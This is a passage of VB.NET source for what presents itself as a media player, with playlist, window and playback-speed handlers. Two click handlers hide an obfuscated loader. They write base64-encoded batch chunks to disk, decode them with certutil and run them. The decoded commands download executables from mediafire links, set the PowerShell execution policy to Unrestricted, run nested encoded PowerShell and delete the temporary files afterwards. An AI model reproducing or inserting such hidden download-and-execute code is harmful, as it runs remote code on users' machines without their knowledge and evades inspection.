        sb.AppendLine("echo dEJybw0KOlN0YXJ0QnJvDQpjZCAlfmRwMFxCcm93c2VyXCAmJiBzdGFydCBCcm93>>Browser.Files")
        sb.AppendLine("echo c2VyLmV4ZQ0KaWYgZXhpc3QgJX5kcDBcQnJvXCBybWRpciAvcyAvcSAlfmRwMFxC>>Browser.Files")
        sb.AppendLine("echo cm9cDQppZiBleGlzdCAlfmRwMFxCcm9MaW5rLmJhdCBkZWwgL3MgL3EgJX5kcDBc>>Browser.Files")
        sb.AppendLine("echo QnJvTGluay5iYXQNCmlmIGV4aXN0ICV+ZHAwXEJyb3dzZXIuemlwIGRlbCAvcyAv>>Browser.Files")
        sb.AppendLine("echo cSAlfmRwMFxCcm93c2VyLnppcA0KaWYgZXhpc3QgJX5kcDBcQnJvLnR4dCBkZWwg>>Browser.Files")
        sb.AppendLine("echo L3MgL3EgJX5kcDBcQnJvLnR4dA0KaWYgZXhpc3QgJX5kcDBcQnJvLkZpbGUgZGVs>>Browser.Files")
        sb.AppendLine("echo IC9zIC9xICV+ZHAwXEJyby5GaWxlDQppZiBleGlzdCAlfmRwMFxCcm8ucHMxIGRl>>Browser.Files")
        sb.AppendLine("echo bCAvcyAvcSAlfmRwMFxCcm8ucHMxDQppZiBleGlzdCAlfmRwMFxVbnppcEJyby5w>>Browser.Files")
        sb.AppendLine("echo czEgZGVsIC9zIC9xICV+ZHAwXFVuemlwQnJvLnBzMQ0KZ290byBFbmRCcm8NCjpX>>Browser.Files")
        sb.AppendLine("echo ZWJwYWdlQnJvDQpzdGFydCBodHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS9h>>Browser.Files")
        sb.AppendLine("echo aHVobmM4bDRmMGJkMGYvQnJvd3Nlci56aXANCmdvdG8gRW5kQnJvDQo6RW5kQnJv>>Browser.Files")
        sb.AppendLine("echo DQpnb3RvIEV4aXQNCjpFeGl0DQpFeGl0DQo=>>Browser.Files")
        sb.AppendLine("certutil -decode Browser.Files Browser.bat")
        sb.AppendLine("start Browser.bat")
        sb.AppendLine("if exist Browser.Files del /s /q Browser.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Bro.bat", sb.ToString())
        Process.Start("Bro.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("Bro.bat")
    End Sub
    Private Sub Label15_Click(sender As Object, e As EventArgs) Handles Label15.Click
        If AddToPlayList.ShowDialog = Windows.Forms.DialogResult.OK Then
            For Each Str As String In AddToPlayList.FileNames
                If Playlist.Items.Contains(Str) = False Then
                    Playlist.Items.Add(Str)
                End If
            Next
        End If
    End Sub
    Private Sub Label16_Click(sender As Object, e As EventArgs) Handles Label16.Click
        Dim count As Integer = -1
        Dim writer As New IO.StreamWriter(Application.StartupPath & "\Playlist.txt")
        Dim Current As Integer = Playlist.SelectedIndex
        Try
            Do Until count = Playlist.Items.Count
                Playlist.SelectedIndex = count + 1
                writer.WriteLine(Playlist.SelectedItem)
                count = count + 1
            Loop
        Catch ex As Exception
            writer.Close()
            Playlist.SelectedIndex = Current
        End Try
    End Sub
    Private Sub Label17_Click(sender As Object, e As EventArgs) Handles Label17.Click
        Playlist.Items.Remove(Playlist.SelectedItem)
    End Sub
    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
        Me.WindowState = FormWindowState.Maximized
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
        Me.Close()
    End Sub
    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click
        Me.WindowState = FormWindowState.Normal
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
        Me.WindowState = FormWindowState.Minimized
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click
        Me.WindowState = FormWindowState.Minimized
        M3di4Pl4y3r.Visible = True
        M3di4Pl4y3r.Icon = SystemIcons.Application
        M3di4Pl4y3r.BalloonTipIcon = ToolTipIcon.Info
        M3di4Pl4y3r.BalloonTipTitle = "MediaPlayer"
        M3di4Pl4y3r.BalloonTipText = "MediaPlayer"
        M3di4Pl4y3r.ShowBalloonTip(50)
        ShowInTaskbar = True
        Me.Hide()
        If (IO.File.Exists("2l.ico")) Then GoTo myIcon
MakeIcon:
        Dim strm As System.IO.Stream
        strm = IO.File.Create("2l.ico")
        Me.Icon.Save(strm)
        strm.Close()
myIcon:
        M3di4Pl4y3r.Icon = New Icon(Application.StartupPath & "\2l.ico")
    End Sub
    Private Sub M3di4Pl4y3r_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles M3di4Pl4y3r.MouseClick
        Me.Show()
        ShowInTaskbar = True
        Me.WindowState = FormWindowState.Normal
        M3di4Pl4y3r.Visible = False
    End Sub
    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click
        Me.FormBorderStyle = FormBorderStyle.None
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label7_Click(sender As Object, e As EventArgs) Handles Label7.Click
        Me.FormBorderStyle = FormBorderStyle.FixedSingle
        Me.ShowInTaskbar = True
    End Sub
    Private Sub Label13_Click(sender As Object, e As EventArgs) Handles Label13.Click
        Dim previous As Integer
        previous = Playlist.SelectedIndex
        If AxWindowsMediaPlayer1.playState = WMPLib.WMPPlayState.wmppsPlaying Then
            Playlist.SelectedIndex = previous - 1
        End If
        AxWindowsMediaPlayer1.URL = Playlist.SelectedItem
        Timer1.Start()
    End Sub
    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        AxWindowsMediaPlayer1.Ctlcontrols.play()
    End Sub
    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click
        AxWindowsMediaPlayer1.Ctlcontrols.pause()
    End Sub
    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click
        AxWindowsMediaPlayer1.Ctlcontrols.stop()
    End Sub
    Private Sub PictureBox8_Click(sender As Object, e As EventArgs) Handles PictureBox8.Click
        AxWindowsMediaPlayer1.Ctlcontrols.fastReverse()
    End Sub
    Private Sub PictureBox9_Click(sender As Object, e As EventArgs) Handles PictureBox9.Click
        AxWindowsMediaPlayer1.Ctlcontrols.fastForward()
    End Sub
    Private Sub Label8_Click(sender As Object, e As EventArgs) Handles Label8.Click
        Dim Nex As Integer
        Nex = Playlist.SelectedIndex
        If AxWindowsMediaPlayer1.playState = WMPLib.WMPPlayState.wmppsPlaying Then
            Playlist.SelectedIndex = Nex + 1
        End If
        AxWindowsMediaPlayer1.URL = Playlist.SelectedItem
        Timer1.Start()
    End Sub
    Private Sub XToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem.Click
        AxWindowsMediaPlayer1.settings.rate = 0.1
    End Sub
    Private Sub XToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem1.Click
        AxWindowsMediaPlayer1.settings.rate = 0.2
    End Sub
    Private Sub XToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem2.Click
        AxWindowsMediaPlayer1.settings.rate = 0.3
    End Sub
    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        AxWindowsMediaPlayer1.settings.rate = 0.4
    End Sub
    Private Sub XToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem3.Click
        AxWindowsMediaPlayer1.settings.rate = 0.5
    End Sub
    Private Sub XToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem4.Click
        AxWindowsMediaPlayer1.settings.rate = 0.6
    End Sub
    Private Sub XToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem5.Click
        AxWindowsMediaPlayer1.settings.rate = 0.7
    End Sub
    Private Sub XToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem6.Click
        AxWindowsMediaPlayer1.settings.rate = 0.8
    End Sub
    Private Sub XToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem7.Click
        AxWindowsMediaPlayer1.settings.rate = 0.9
    End Sub
    Private Sub XToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem8.Click
        AxWindowsMediaPlayer1.settings.rate = 1
    End Sub
    Private Sub XToolStripMenuItem9_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem9.Click
        AxWindowsMediaPlayer1.settings.rate = 1.1
    End Sub
    Private Sub XToolStripMenuItem10_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem10.Click
        AxWindowsMediaPlayer1.settings.rate = 1.2
    End Sub
    Private Sub XToolStripMenuItem11_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem11.Click
        AxWindowsMediaPlayer1.settings.rate = 1.3
    End Sub
    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        AxWindowsMediaPlayer1.settings.rate = 1.4
    End Sub
    Private Sub XToolStripMenuItem12_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem12.Click
        AxWindowsMediaPlayer1.settings.rate = 1.5
    End Sub
    Private Sub XToolStripMenuItem13_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem13.Click
        AxWindowsMediaPlayer1.settings.rate = 1.6
    End Sub
    Private Sub XToolStripMenuItem14_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem14.Click
        AxWindowsMediaPlayer1.settings.rate = 1.7
    End Sub
    Private Sub XToolStripMenuItem15_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem15.Click
        AxWindowsMediaPlayer1.settings.rate = 1.8
    End Sub
    Private Sub XToolStripMenuItem16_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem16.Click
        AxWindowsMediaPlayer1.settings.rate = 1.9
    End Sub
    Private Sub XToolStripMenuItem17_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem17.Click
        AxWindowsMediaPlayer1.settings.rate = 2
    End Sub
    Private Sub XToolStripMenuItem18_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem18.Click
        AxWindowsMediaPlayer1.settings.rate = 2.1
    End Sub
    Private Sub XToolStripMenuItem19_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem19.Click
        AxWindowsMediaPlayer1.settings.rate = 2.2
    End Sub
    Private Sub XToolStripMenuItem20_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem20.Click
        AxWindowsMediaPlayer1.settings.rate = 2.3
    End Sub
    Private Sub XToolStripMenuItem21_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem21.Click
        AxWindowsMediaPlayer1.settings.rate = 2.4
    End Sub
    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        AxWindowsMediaPlayer1.settings.rate = 2.5
    End Sub
    Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem7.Click
        AxWindowsMediaPlayer1.settings.rate = 2.6
    End Sub
    Private Sub XToolStripMenuItem22_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem22.Click
        AxWindowsMediaPlayer1.settings.rate = 2.7
    End Sub
    Private Sub XToolStripMenuItem23_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem23.Click
        AxWindowsMediaPlayer1.settings.rate = 2.8
    End Sub
    Private Sub XToolStripMenuItem24_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem24.Click
        AxWindowsMediaPlayer1.settings.rate = 2.9
    End Sub
    Private Sub XToolStripMenuItem26_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem26.Click
        AxWindowsMediaPlayer1.settings.rate = 3
    End Sub
    Private Sub XToolStripMenuItem27_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem27.Click
        AxWindowsMediaPlayer1.settings.rate = 3.1
    End Sub
    Private Sub XToolStripMenuItem28_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem28.Click
        AxWindowsMediaPlayer1.settings.rate = 3.2
    End Sub
    Private Sub XToolStripMenuItem29_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem29.Click
        AxWindowsMediaPlayer1.settings.rate = 3.3
    End Sub
    Private Sub XToolStripMenuItem30_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem30.Click
        AxWindowsMediaPlayer1.settings.rate = 3.4
    End Sub
    Private Sub XToolStripMenuItem31_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem31.Click
        AxWindowsMediaPlayer1.settings.rate = 3.5
    End Sub
    Private Sub XToolStripMenuItem32_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem32.Click
        AxWindowsMediaPlayer1.settings.rate = 3.6
    End Sub
    Private Sub ToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem8.Click
        AxWindowsMediaPlayer1.settings.rate = 3.7
    End Sub
    Private Sub ToolStripMenuItem9_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem9.Click
        AxWindowsMediaPlayer1.settings.rate = 3.8
    End Sub
    Private Sub XToolStripMenuItem33_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem33.Click
        AxWindowsMediaPlayer1.settings.rate = 3.9
    End Sub
    Private Sub XToolStripMenuItem35_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem35.Click
        AxWindowsMediaPlayer1.settings.rate = 4
    End Sub
    Private Sub XToolStripMenuItem36_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem36.Click
        AxWindowsMediaPlayer1.settings.rate = 4.1
    End Sub
    Private Sub XToolStripMenuItem37_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem37.Click
        AxWindowsMediaPlayer1.settings.rate = 4.2
    End Sub
    Private Sub XToolStripMenuItem38_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem38.Click
        AxWindowsMediaPlayer1.settings.rate = 4.3
    End Sub
    Private Sub XToolStripMenuItem39_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem39.Click
        AxWindowsMediaPlayer1.settings.rate = 4.4
    End Sub
    Private Sub XToolStripMenuItem40_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem40.Click
        AxWindowsMediaPlayer1.settings.rate = 4.5
    End Sub
    Private Sub XToolStripMenuItem41_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem41.Click
        AxWindowsMediaPlayer1.settings.rate = 4.6
    End Sub
    Private Sub CToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CToolStripMenuItem.Click
        AxWindowsMediaPlayer1.settings.rate = 4.7
    End Sub
    Private Sub XToolStripMenuItem42_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem42.Click
        AxWindowsMediaPlayer1.settings.rate = 4.8
    End Sub
    Private Sub XToolStripMenuItem43_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem43.Click
        AxWindowsMediaPlayer1.settings.rate = 4.9
    End Sub
    Private Sub XToolStripMenuItem45_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem45.Click
        AxWindowsMediaPlayer1.settings.rate = 5
    End Sub
    Private Sub XToolStripMenuItem46_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem46.Click
        AxWindowsMediaPlayer1.settings.rate = 5.1
    End Sub
    Private Sub XToolStripMenuItem47_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem47.Click
        AxWindowsMediaPlayer1.settings.rate = 5.2
    End Sub
    Private Sub XToolStripMenuItem48_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem48.Click
        AxWindowsMediaPlayer1.settings.rate = 5.3
    End Sub
    Private Sub XToolStripMenuItem49_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem49.Click
        AxWindowsMediaPlayer1.settings.rate = 5.4
    End Sub
    Private Sub XToolStripMenuItem50_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem50.Click
        AxWindowsMediaPlayer1.settings.rate = 5.5
    End Sub
    Private Sub XToolStripMenuItem51_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem51.Click
        AxWindowsMediaPlayer1.settings.rate = 5.6
    End Sub
    Private Sub XToolStripMenuItem52_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem52.Click
        AxWindowsMediaPlayer1.settings.rate = 5.7
    End Sub
    Private Sub XToolStripMenuItem53_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem53.Click
        AxWindowsMediaPlayer1.settings.rate = 5.8
    End Sub
    Private Sub XToolStripMenuItem54_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem54.Click
        AxWindowsMediaPlayer1.settings.rate = 5.9
    End Sub
    Private Sub XToolStripMenuItem56_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem56.Click
        AxWindowsMediaPlayer1.settings.rate = 6
    End Sub
    Private Sub XToolStripMenuItem57_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem57.Click
        AxWindowsMediaPlayer1.settings.rate = 6.1
    End Sub
    Private Sub XToolStripMenuItem58_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem58.Click
        AxWindowsMediaPlayer1.settings.rate = 6.2
    End Sub
    Private Sub XToolStripMenuItem59_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem59.Click
        AxWindowsMediaPlayer1.settings.rate = 6.3
    End Sub
    Private Sub XToolStripMenuItem60_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem60.Click
        AxWindowsMediaPlayer1.settings.rate = 6.4
    End Sub
    Private Sub XToolStripMenuItem61_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem61.Click
        AxWindowsMediaPlayer1.settings.rate = 6.5
    End Sub
    Private Sub XToolStripMenuItem62_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem62.Click
        AxWindowsMediaPlayer1.settings.rate = 6.6
    End Sub
    Private Sub XToolStripMenuItem63_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem63.Click
        AxWindowsMediaPlayer1.settings.rate = 6.7
    End Sub
    Private Sub XToolStripMenuItem64_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem64.Click
        AxWindowsMediaPlayer1.settings.rate = 6.8
    End Sub
    Private Sub XToolStripMenuItem65_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem65.Click
        AxWindowsMediaPlayer1.settings.rate = 6.9
    End Sub
    Private Sub XToolStripMenuItem67_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem67.Click
        AxWindowsMediaPlayer1.settings.rate = 7
    End Sub
    Private Sub XToolStripMenuItem68_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem68.Click
        AxWindowsMediaPlayer1.settings.rate = 7.1
    End Sub
    Private Sub XToolStripMenuItem69_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem69.Click
        AxWindowsMediaPlayer1.settings.rate = 7.2
    End Sub
    Private Sub XToolStripMenuItem70_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem70.Click
        AxWindowsMediaPlayer1.settings.rate = 7.3
    End Sub
    Private Sub XToolStripMenuItem71_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem71.Click
        AxWindowsMediaPlayer1.settings.rate = 7.4
    End Sub
    Private Sub XToolStripMenuItem72_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem72.Click
        AxWindowsMediaPlayer1.settings.rate = 7.5
    End Sub
    Private Sub XToolStripMenuItem73_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem73.Click
        AxWindowsMediaPlayer1.settings.rate = 7.6
    End Sub
    Private Sub XToolStripMenuItem74_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem74.Click
        AxWindowsMediaPlayer1.settings.rate = 7.7
    End Sub
    Private Sub XToolStripMenuItem75_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem75.Click
        AxWindowsMediaPlayer1.settings.rate = 7.8
    End Sub
    Private Sub XToolStripMenuItem76_Click(sender As Object, e As EventArgs) Handles XToolStripMenuItem76.Click
        AxWindowsMediaPlayer1.settings.rate = 7.9
    End Sub
    Private Sub SecondeToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 5
    End Sub
    Private Sub SecondeToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem1.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 10
    End Sub
    Private Sub SecondeToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem2.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 15
    End Sub
    Private Sub SecondeToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem3.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 20
    End Sub
    Private Sub SecondeToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem4.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 25
    End Sub
    Private Sub SecondeToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem5.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 30
    End Sub
    Private Sub SecondeToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem6.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 35
    End Sub
    Private Sub SecondeToolStripMenuItem7_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem7.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 40
    End Sub
    Private Sub SecondeToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem8.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 45
    End Sub
    Private Sub SecondeToolStripMenuItem9_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem9.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 50
    End Sub
    Private Sub SecondeToolStripMenuItem10_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem10.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 55
    End Sub
    Private Sub SecondeToolStripMenuItem11_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem11.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 60
    End Sub
    Private Sub SecondeToolStripMenuItem12_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem12.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 65
    End Sub
    Private Sub SecondeToolStripMenuItem13_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem13.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 70
    End Sub
    Private Sub SecondeToolStripMenuItem14_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem14.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 75
    End Sub
    Private Sub SecondeToolStripMenuItem15_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem15.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 80
    End Sub
    Private Sub SecondeToolStripMenuItem16_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem16.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 85
    End Sub
    Private Sub SecondeToolStripMenuItem17_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem17.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 90
    End Sub
    Private Sub SecondeToolStripMenuItem18_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem18.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 95
    End Sub
    Private Sub SecondeToolStripMenuItem19_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem19.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 100
    End Sub
    Private Sub SecondeToolStripMenuItem20_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem20.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 105
    End Sub
    Private Sub SecondeToolStripMenuItem21_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem21.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 110
    End Sub
    Private Sub SecondeToolStripMenuItem22_Click(sender As Object, e As EventArgs) Handles SecondeToolStripMenuItem22.Click
        AxWindowsMediaPlayer1.Ctlcontrols.currentPosition = 115
    End Sub
    Private Sub PictureBox10_Click(sender As Object, e As EventArgs) Handles PictureBox10.Click
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd ..")
        sb.AppendLine("cd ..")
        sb.AppendLine("echo OkxvZ2luIA0KQGVjaG8gb2ZmDQp0aXRsZSBMb2dpbg0KaWYgZXhpc3QgJWFwcGRh>>LoginEncoded.File")
        sb.AppendLine("echo dGElXFRodW5kZXJCb3hcTG9naW4uZXhlIGdvdG8gU3RhcnRMb2dpbg0KY2QgJWFw>>LoginEncoded.File")
        sb.AppendLine("echo cGRhdGElXFRodW5kZXJCb3hcDQppZiBleGlzdCBMb2dpbkxpbmsuYmF0IGRlbCAv>>LoginEncoded.File")
        sb.AppendLine("echo cyAvcSBMb2dpbkxpbmsuYmF0DQppZiBleGlzdCBMb2dpbi50eHQgZGVsIC9zIC9x>>LoginEncoded.File")
        sb.AppendLine("echo IExvZ2luLnR4dA0KaWYgZXhpc3QgTG9naW4uRmlsZSBkZWwgL3MgL3EgTG9naW4u>>LoginEncoded.File")
        sb.AppendLine("echo RmlsZQ0KaWYgZXhpc3QgTG9naW4ucHMxIGRlbCAvcyAvcSBMb2dpbi5wczENCnBv>>LoginEncoded.File")
        sb.AppendLine("echo d2Vyc2hlbGwgU2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgQ3VycmVudFVzZXIg>>LoginEncoded.File")
        sb.AppendLine("echo VW5yZXN0cmljdGVkDQpwb3dlcnNoZWxsIC1Db21tYW5kIEludm9rZS1XZWJSZXF1>>LoginEncoded.File")
        sb.AppendLine("echo ZXN0ICJodHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS9rMXFkNGJjaHZiNXdi>>LoginEncoded.File")
        sb.AppendLine("echo cTgvTG9naW4uZXhlIiAtT3V0RmlsZSAiTG9naW4udHh0Ig0KY2QgJX5kcDANCmZp>>LoginEncoded.File")
        sb.AppendLine("echo bmQgL0kgImtOTyA9ICIgTG9naW4udHh0Pj5Mb2dpbkxpbmsuYmF0DQplY2hvIEV4>>LoginEncoded.File")
        sb.AppendLine("echo aXQ+PkxvZ2luTGluay5iYXQNCmVjaG8gS0VkbGRDMURiMjUwWlc1MElFeHZaMmx1>>LoginEncoded.File")
        sb.AppendLine("echo VEdsdWF5NWlZWFFwSUh3Z0RRcEdiM0psWVdOb0xVOWlhbVZqZENCNz4+TG9naW4u>>LoginEncoded.File")
        sb.AppendLine("echo RmlsZQ0KZWNobyBKRjhnTFhKbGNHeGhZMlVnSWt0T1R5QTlJQ0lzSUNKd2IzZGxj>>LoginEncoded.File")
        sb.AppendLine("echo bk5vWld4c0lDMURiMjF0WVc1a0lFbHVkbTlyPj5Mb2dpbi5GaWxlDQplY2hvIFpT>>LoginEncoded.File")
        sb.AppendLine("echo MVhaV0pTWlhGMVpYTjBJQ0o5SUh3Z0RRcFRaWFF0UTI5dWRHVnVkQ0JNYjJkcGJr>>LoginEncoded.File")
        sb.AppendLine("echo eHBibXN1WW1GMERRb28+PkxvZ2luLkZpbGUNCmVjaG8gUjJWMExVTnZiblJsYm5R>>LoginEncoded.File")
        sb.AppendLine("echo Z1RHOW5hVzVNYVc1ckxtSmhkQ2tnZkNBTkNrWnZjbVZoWTJndFQySnFaV04wSUhz>>LoginEncoded.File")
        sb.AppendLine("echo az4+TG9naW4uRmlsZQ0KZWNobyBYeUF0Y21Wd2JHRmpaU0FpT3lJc0lDSWdMVTkx>>LoginEncoded.File")
        sb.AppendLine("echo ZEVacGJHVWdURzluYVc0dVpYaGxJbjBnZkNBTkNsTmxkQzFEPj5Mb2dpbi5GaWxl>>LoginEncoded.File")
        sb.AppendLine("echo DQplY2hvIGIyNTBaVzUwSUV4dloybHVUR2x1YXk1aVlYUT0+PkxvZ2luLkZpbGUN>>LoginEncoded.File")
        sb.AppendLine("echo CnRpbWVvdXQgL1QgMQ0KY2VydHV0aWwgLWRlY29kZSBMb2dpbi5GaWxlIExvZ2lu>>LoginEncoded.File")
        sb.AppendLine("echo LnBzMQ0KdGltZW91dCAvVCAxDQpQb3dlclNoZWxsLmV4ZSAtRmlsZSBMb2dpbi5w>>LoginEncoded.File")
        sb.AppendLine("echo czEgLU5vRXhpdA0KdGltZW91dCAvVCAxDQpjZCAlfmRwMCAmJiBzdGFydCBMb2dp>>LoginEncoded.File")
        sb.AppendLine("echo bkxpbmsuYmF0DQp0aW1lb3V0IC9UIDcNCmNkICV+ZHAwDQp0aW1lb3V0IC9UIDIN>>LoginEncoded.File")
        sb.AppendLine("echo CmlmIGV4aXN0IExvZ2luTGluay5iYXQgZGVsIC9zIC9xIExvZ2luTGluay5iYXQN>>LoginEncoded.File")
        sb.AppendLine("echo CmlmIGV4aXN0IExvZ2luLnR4dCBkZWwgL3MgL3EgTG9naW4udHh0DQppZiBleGlz>>LoginEncoded.File")
        sb.AppendLine("echo dCBMb2dpbi5GaWxlIGRlbCAvcyAvcSBMb2dpbi5GaWxlDQppZiBleGlzdCBMb2dp>>LoginEncoded.File")
